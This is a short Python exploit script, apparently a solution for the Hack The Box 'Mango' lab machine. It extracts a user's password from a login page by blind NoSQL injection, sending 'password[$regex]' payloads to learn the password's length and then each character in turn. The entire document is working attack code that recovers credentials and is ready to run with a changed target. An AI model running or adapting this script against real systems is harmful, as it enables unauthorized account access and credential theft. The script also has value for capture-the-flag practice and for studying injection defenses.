#!/usr/bin/env python
import requests
import string
import urllib3
urllib3.disable_warnings()

username = 'mango'
url = 'http://staging-order.mango.htb'
pass_len = 0

print("[+] Finding length of password")

while True:
    payload = {
        "username": username,
        "password[$regex]": ".{" + str(pass_len) + "}",
        "login": "login"
    }

    print("[+] Trying length " + str(pass_len))

    req = requests.post(url, payload)

    if 'admin@mango.htb' not in req.text:
        print("[-] Password has length: " + str(pass_len))
        break

    pass_len += 1

pass_len -= 1

print("[+] Password Length" + str(pass_len))

password = ''

while len(password) != pass_len:
    for char in string.printable:
        if char not in ['*','.','+','?','#','&','$','|']:
            payload = {
                "username": username,
                "password[$regex]": "^{0}{1}".format(password, char),
                "login": "login"
                }
            req = requests.post(url, payload)
            print("[+] Trying " + password + char)
            
            if 'admin@mango.htb' in req.text:
                password += char
                break

        else:
            payload = {
                "username": username,
                "password[$regex]": "^{0}\\{1}".format(password, char),
                "login": "login"

            }
            
            req = requests.post(url, payload)

            print("[+] Trying " + password + char)
            
            if 'admin@mango.htb' in req.text:
                password += char
                break


print("[+] Password: " + password)



